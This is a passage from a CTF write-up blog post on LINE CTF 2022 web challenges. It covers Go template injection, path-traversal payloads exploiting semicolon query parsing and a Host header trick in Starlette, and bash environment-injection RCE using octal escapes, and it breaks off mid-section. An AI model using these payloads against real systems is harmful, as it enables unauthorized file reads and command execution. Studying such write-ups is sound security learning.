<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="en">
<head>
    <meta charset="utf-8">
<title>LINE CTF 2022 Notes - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="google-adsense-account" content="ca-pub-1121865251398741">



            
<link href="https://blog.huli.tw/2022/03/27/linectf-2022-writeup/" rel="alternate" hreflang="zh-TW" />
            
    




    
<link rel="canonical" href="https://blog.huli.tw/2022/03/27/en/linectf-2022-writeup/">
    





    <meta name="description" content="I participated in LINE CTF 2022 with the team Water Paddler and we ranked seventh with the help of my teammates. I only contributed to one question, while the others were solved by my teammates or stu">
<meta property="og:type" content="article">
<meta property="og:title" content="LINE CTF 2022 Notes">
<meta property="og:url" content="https://blog.huli.tw/2022/03/27/en/linectf-2022-writeup/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="I participated in LINE CTF 2022 with the team Water Paddler and we ranked seventh with the help of my teammates. I only contributed to one question, while the others were solved by my teammates or stu">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog.huli.tw/img/linectf-2022-writeup/cover-en.png">
<meta property="article:published_time" content="2022-03-27T07:15:47.000Z">
<meta property="article:modified_time" content="2023-06-20T05:46:56.922Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.huli.tw/img/linectf-2022-writeup/cover-en.png">



<link rel="alternative" href="/atom.xml" title="LINE CTF 2022 Notes" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=4.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/en">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/en/archives">Archive</a>
            
            <a class="navbar-item "
               href="/en/categories">Categories</a>
            
            <a class="navbar-item "
               href="/en/about">About</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="Table of Contents">
                    Table of Contents
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#gotm96-solves">1&nbsp;&nbsp;<b>gotm(96 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#memo-drive42-solves">2&nbsp;&nbsp;<b>Memo Drive(42 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#bb27-solves">3&nbsp;&nbsp;<b>bb(27 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#online-library19-solves">4&nbsp;&nbsp;<b>online library(19 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#haribote-secure-note7-solves">5&nbsp;&nbsp;<b>Haribote Secure Note(7 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#title-todo6-solves">6&nbsp;&nbsp;<b>title todo(6 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#me7-ball2-solves">7&nbsp;&nbsp;<b>me7-ball(2 solves)</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
                
                <i class="fab fa-twitter"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-en.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
               <a class="navbar-item" href="/2022/03/27/linectf-2022-writeup/">中文</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            LINE CTF 2022 Notes
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2022-03-27T07:15:47.000Z" itemprop="datePublished">27 March 2022</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/en/categories/Security/">Security</a>
        </span>
        
        
        
        <spen data-nosnippet class="column is-narrow">(Translated by ChatGPT)</span>
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>I participated in LINE CTF 2022 with the team <a target="_blank" rel="noopener" href="https://twitter.com/Water_Paddler">Water Paddler</a> and we ranked seventh with the help of my teammates. I only contributed to one question, while the others were solved by my teammates or stuck. This article briefly summarizes the solutions to each question, most of which are referenced from <a target="_blank" rel="noopener" href="https://blog.maple3142.net/2022/03/27/line-ctf-2022-writeups">LINE CTF 2022 Writeups by maple3142</a>.</p>
<span id="more"></span>

<h2><span id="gotm96-solves">gotm(96 solves)</span></h2><p>This question was solved by my teammates, so I didn’t look into it carefully. However, after the game, I read other writeups and found that it was a go SSTI, which appeared here:</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go">acc <span class="token operator">:=</span> <span class="token function">get_account</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span>
tpl<span class="token punctuation">,</span> err <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token string">"Logged in as "</span> <span class="token operator">+</span> acc<span class="token punctuation">.</span>id<span class="token punctuation">)</span>
<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
tpl<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token operator">&amp;</span>acc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>I haven’t encountered go SSTI before, so I took some notes. You can use {<code>&#123;.&#125;&#125;</code> to dump the entire object passed in. Here are a few reference links:</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1286">GO中SSTI研究</a></li>
<li><a target="_blank" rel="noopener" href="https://tyskill.github.io/posts/gossti/">Go SSTI初探</a></li>
</ol>
<h2><span id="memo-drive42-solves">Memo Drive(42 solves)</span></h2><p>First, here is the key code:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    context <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        context<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request
        clientId <span class="token operator">=</span> getClientID<span class="token punctuation">(</span>request<span class="token punctuation">.</span>client<span class="token punctuation">.</span>host<span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token string">'&amp;'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query <span class="token keyword">or</span> <span class="token string">'.'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query <span class="token keyword">or</span> <span class="token string">'.'</span> <span class="token keyword">in</span> unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_params<span class="token punctuation">[</span>clientId<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span>
        
        filename <span class="token operator">=</span> request<span class="token punctuation">.</span>query_params<span class="token punctuation">[</span>clientId<span class="token punctuation">]</span>
        path <span class="token operator">=</span> <span class="token string">'./memo/'</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_params<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> filename
        
        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
        contents <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        
        context<span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span> <span class="token operator">=</span> filename
        context<span class="token punctuation">[</span><span class="token string">'contents'</span><span class="token punctuation">]</span> <span class="token operator">=</span> contents<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The flag for this question is in <code>./memo/flag</code>, so all we need to do is find a way to read the flag from the path in the above code.</p>
<p>My teammate used this payload: <code>/view?id=flag;%2f%2e%2e/;</code>. Since I’m not familiar with Python, I set up a simple server to observe:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote
<span class="token keyword">import</span> uvicorn
<span class="token keyword">from</span> starlette<span class="token punctuation">.</span>applications <span class="token keyword">import</span> Starlette
<span class="token keyword">from</span> starlette<span class="token punctuation">.</span>routing <span class="token keyword">import</span> Route
<span class="token keyword">from</span> starlette<span class="token punctuation">.</span>responses <span class="token keyword">import</span> JSONResponse

<span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        clientId <span class="token operator">=</span> <span class="token string">"id"</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"request.url:"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"request.url.query"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"params:"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>query_params<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"unquote params:"</span><span class="token punctuation">,</span> unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_params<span class="token punctuation">[</span>clientId<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'&amp;'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query <span class="token keyword">or</span> <span class="token string">'.'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query <span class="token keyword">or</span> <span class="token string">'.'</span> <span class="token keyword">in</span> unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_params<span class="token punctuation">[</span>clientId<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span>
        
        filename <span class="token operator">=</span> request<span class="token punctuation">.</span>query_params<span class="token punctuation">[</span>clientId<span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"filename:"</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"keys:"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>query_params<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        path <span class="token operator">=</span> <span class="token string">'./memo/'</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_params<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> filename
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"path:"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span>
    
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    
    <span class="token keyword">return</span> JSONResponse<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"a"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

routes <span class="token operator">=</span> <span class="token punctuation">[</span>
    Route<span class="token punctuation">(</span><span class="token string">'/view'</span><span class="token punctuation">,</span> endpoint<span class="token operator">=</span>view<span class="token punctuation">)</span>
<span class="token punctuation">]</span>

app <span class="token operator">=</span> Starlette<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> routes<span class="token operator">=</span>routes<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    uvicorn<span class="token punctuation">.</span>run<span class="token punctuation">(</span>app<span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">11000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Let’s take a look at what my teammate’s payload does: <code>/view?id=flag;%2f%2e%2e/;</code></p>
<pre class="line-numbers language-none"><code class="language-none">request.url: http:&#x2F;&#x2F;0.0.0.0:11000&#x2F;view?id&#x3D;flag;%2f%2e%2e&#x2F;;
request.url.query id&#x3D;flag;%2f%2e%2e&#x2F;;
params: id&#x3D;flag&amp;%2F..%2F&#x3D;
unquote params: flag
filename: flag
keys: dict_keys([&#39;id&#39;, &#39;&#x2F;..&#x2F;&#39;])
path: .&#x2F;memo&#x2F;id&#x2F;..&#x2F;&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>request.url</code> is the raw URL without decoding, and <code>request.url.query</code> is also the undecoded version. When it reaches <code>request.query_params</code>, it is parsed into two params:</p>
<ol>
<li>id&#x3D;flag</li>
<li>%2F..%2f&#x3D;</li>
</ol>
<p>It seems that even if you don’t use <code>&amp;</code>, you can create two params because of the semicolon <code>;</code>.</p>
<p>Finally, when <code>request.query_params.keys()</code> is decoded, it becomes <code>./memo/id..//flag</code>.</p>
<p>However, I saw on Discord that this is enough: <code>id=flag;/%2e%2e</code>. The result is:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">request<span class="token punctuation">.</span>url<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.0</span><span class="token punctuation">:</span><span class="token number">11000</span><span class="token operator">/</span>view?<span class="token builtin">id</span><span class="token operator">=</span>flag<span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e
request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query <span class="token builtin">id</span><span class="token operator">=</span>flag<span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e
params<span class="token punctuation">:</span> <span class="token builtin">id</span><span class="token operator">=</span>flag<span class="token operator">&amp;</span><span class="token operator">%</span>2F<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">=</span>
unquote params<span class="token punctuation">:</span> flag
filename<span class="token punctuation">:</span> flag
keys<span class="token punctuation">:</span> dict_keys<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'/..'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
path<span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token operator">/</span>memo<span class="token operator">/</span><span class="token builtin">id</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>I also saw a different solution on Discord (from bbangjo#3967), which uses the Host header:</p>
<pre class="line-numbers language-none"><code class="language-none">GET http:&#x2F;&#x2F;0.0.0.0:11000&#x2F;view?id&#x3D;flag&amp;&#x2F;..
Host: 0.0.0.0#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>It produces a magical result:</p>
<pre class="line-numbers language-none"><code class="language-none">request.url: http:&#x2F;&#x2F;0.0.0.0#&#x2F;view?id&#x3D;flag&amp;&#x2F;..
request.url.query
params: id&#x3D;flag&amp;%2F..&#x3D;
unquote params: flag
filename: flag
keys: dict_keys([&#39;id&#39;, &#39;&#x2F;..&#39;])
path: .&#x2F;memo&#x2F;id&#x2F;..&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Although <code>request.url.query</code> disappears completely, <code>request.query_params</code> still has something, so it bypasses the check for <code>request.url.query</code>.</p>
<p>According to him, since <code>request.url</code> is constructed from the Host header, we can check the code to verify it. If I’m not mistaken, it should be here: <a target="_blank" rel="noopener" href="https://github.com/encode/starlette/blob/b1ae0c3621034f1531b9983389ce90be8d140bc6/starlette/datastructures.py#L38">starlette&#x2F;datastructures.py#L38</a>:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> host_header <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
  url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>scheme<span class="token punctuation">&#125;</span></span><span class="token string">://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>host_header<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>Because the Host is followed by a <code>#</code>, the query string behind it is parsed as a fragment, not a query string. Therefore, <code>request.url.query</code> will be empty.</p>
<p>Why does <code>request.query_params</code> still have something? Because it directly takes the original query string, not <code>request.url.query</code>, here: <a target="_blank" rel="noopener" href="https://github.com/encode/starlette/blob/6182d0a0bc7e5817197d2919b18d67f70e3a71d1/starlette/requests.py#L116">starlette&#x2F;requests.py#L116</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@property</span>
<span class="token keyword">def</span> <span class="token function">query_params</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> QueryParams<span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"_query_params"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>_query_params <span class="token operator">=</span> QueryParams<span class="token punctuation">(</span>self<span class="token punctuation">.</span>scope<span class="token punctuation">[</span><span class="token string">"query_string"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> self<span class="token punctuation">.</span>_query_params<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>This is a difference that can only be found by looking at the source code.</p>
<p>Supplement on March 29, 2022:</p>
<p>Thanks to @Zedd for reminding us that the behavior of treating <code>;</code> as <code>&amp;</code> is related to the Python version, because it can cause cache poisoning. This issue has been fixed in newer versions, and the version used in the challenge is 3.9.0, which is why this problem exists. When I reproduced it on my local machine, I also used an unpatched version.</p>
<p>The vulnerability number is CVE-2021-23336, and details can be found here: <a target="_blank" rel="noopener" href="https://python-security.readthedocs.io/vuln/urllib-query-string-semicolon-separator.html">urllib parse_qsl(): Web cache poisoning - semicolon as a query args separator</a>.</p>
<h2><span id="bb27-solves">bb(27 solves)</span></h2><p>The code is very short:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">bye</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token variable">$ptn</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$ptn</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"env"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=></span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bye</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/=/i"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">bye</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/[a-zA-Z]/i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$k</span><span class="token punctuation">&#125;</span></span>=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$v</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bash -c 'imdude'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"env"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=></span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bye</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/=/i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$k</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Basically, it is to achieve RCE after controlling the environment variables, which naturally reminds people of the article published by P cow some time ago: <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">How I hack bash through environment injection</a>, which mentions that commands can be executed by controlling <code>BASH_ENV</code>.</p>
<p>However, the more troublesome thing is that a-zA-Z cannot be used, so you have to write instructions to read the flag and return it to your own server without using English letters.</p>
<p>Someone in the chat room gave a link to a similar problem for reference: <a target="_blank" rel="noopener" href="https://ctftime.org/writeup/8468">34C3 CTF &#x2F; Tasks &#x2F; minbashmaxfun &#x2F; Writeup</a>. After reading the writeup given at the beginning, I realized that it can be used like this:</p>
<pre class="line-numbers language-none"><code class="language-none"># Equivalent to $&#39;id&#39;
$&#39;\151\144&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>By doing this, you can bypass the restrictions without using letters. Bash is really profound.</p>
<p>Someone posted this string on Discord, which is worth referring to and taking notes: <a target="_blank" rel="noopener" href="https://threadreaderapp.com/thread/1023682809368653826.html">Readable version</a>, Twitter original string: <a target="_blank" rel="noopener" href="https://twitter.com/DissectMalware/status/1023682809368653826">https://twitter.com/DissectMalware/status/1023682809368653826</a></p>
<h2><span id="online-library19-solves">online library(19 solves)</span></h2><p>This is a web page that can read a specific file range, and the key is in this part:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/:t/:s/:e"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token operator">:</span> Express<span class="token punctuation">.</span>Request<span class="token punctuation">,</span> <span class="token literal-property property">res</span><span class="token operator">:</span> Express<span class="token punctuation">.</span>Response<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token parameter"><span class="token keyword">void</span></span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
